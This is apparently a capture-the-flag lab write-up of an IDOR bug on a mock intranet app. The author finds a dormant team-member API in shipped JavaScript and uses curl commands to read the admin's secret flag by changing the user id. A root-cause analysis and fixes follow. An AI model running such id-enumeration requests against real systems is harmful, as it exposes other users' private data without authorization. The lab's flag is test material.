# Acme Intranet Pwnbox Lab - Session-Tied Profile IDOR Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: IDOR, broken access control, incomplete authorization coverage, dormant API exposure

## Observation

Login app at `https://2060640a8540.pwnbox-lab.com/`.

Initial page hints:

- "Demo account: `demo / demo`"
- Challenge text says the user id is tied to the session, so tampering with it should not work.

Frontend login flow posts JSON to `/api/login` and redirects to `/dashboard` on success.

Successful login set signed cookies:

```text
session=eyJ1aWQiOjQyfQ==
session.sig=KacPVn-0GnztMFZy9Aqbudyu7Dc
```

Decoded session payload:

```json
{"uid":42}
```

Dashboard loads `/js/profile.js` and `/js/team.js`. Announcement mentions **Mira (#1, admin)**.

## Hypothesis

The developer may have secured the primary profile endpoint by deriving the user from the signed session, but other endpoints that accept a numeric user id may still be reachable without ownership checks. Dormant JavaScript modules are a good recon target.

## Evidence

### Session binding on `/api/me`

`profile.js` comment and behavior:

```javascript
// /api/me derives the user from the session cookie — no id parameter is sent
// or accepted, so swapping ids on this call won't get you anywhere.
const res = await fetch('/api/me', { credentials: 'same-origin' });
```

Authenticated response for demo:

```json
{"id":42,"username":"demo","name":"Alex Demo","email":"demo@acme.intra","title":"Software Engineer"}
```

No `secret` field returned.

### Session tampering blocked

Forged `session` with invalid or missing `session.sig`:

```text
GET /api/me -> 401 {"error":"authentication required"}
```

### Dormant team API in `team.js`

```javascript
// GET /api/teamMemberInfo/<numeric user id>
// → { id, username, name, email, title, secret }
const TEAM_API_BASE = '/api/teamMemberInfo';
```

The widget is not invoked from the dashboard page, but the endpoint exists.

## Test

Login as demo, then enumerate team member ids:

```bash
curl -sS -c /tmp/cj -X POST 'https://2060640a8540.pwnbox-lab.com/api/login' \
  -H 'content-type: application/json' \
  -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/teamMemberInfo/1'
curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/teamMemberInfo/42'
```

## Result

`GET /api/teamMemberInfo/1` returned admin data including `secret`:

```json
{
  "id": 1,
  "username": "mira",
  "name": "Mira Patel",
  "email": "mira@acme.intra",
  "title": "CTO",
  "secret": "pwnbox{4880226857ecdeb7a41ec5d664ddbd50}"
}
```

`GET /api/teamMemberInfo/42` returned demo user with:

```json
"secret": "no secret here, sorry"
```

Ids `2` and `3` returned `404 {"error":"not found"}`.

## Conclusion

Confirmed IDOR on `/api/teamMemberInfo/:id`. The signed session correctly protects `/api/me`, but authorization was not applied consistently across all object-reference endpoints. Any authenticated user can read another user's `secret` by changing the path id.

## Root Cause

Partial authorization: one endpoint derives identity from session; a second endpoint trusts a client-supplied numeric id without verifying ownership or role.

## Failed Assumptions

- Tampering the session cookie uid does not bypass `/api/me` — signature validation works.
- Changing ids on `/api/me` is not possible because no id parameter exists.

## Working Theory

Recon through shipped-but-unused JavaScript exposed an alternate data path that bypassed the developer's "session-tied id" control.

## Flag

`pwnbox{4880226857ecdeb7a41ec5d664ddbd50}`

## Fix

- Apply the same ownership check to every endpoint that returns user-specific data.
- Do not expose sensitive fields like `secret` through lookup-by-id APIs unless the caller is authorized.
- Remove or gate dormant endpoints behind feature flags with server-side authorization.
- Regression-test all id-parameter routes, not only the primary profile route.
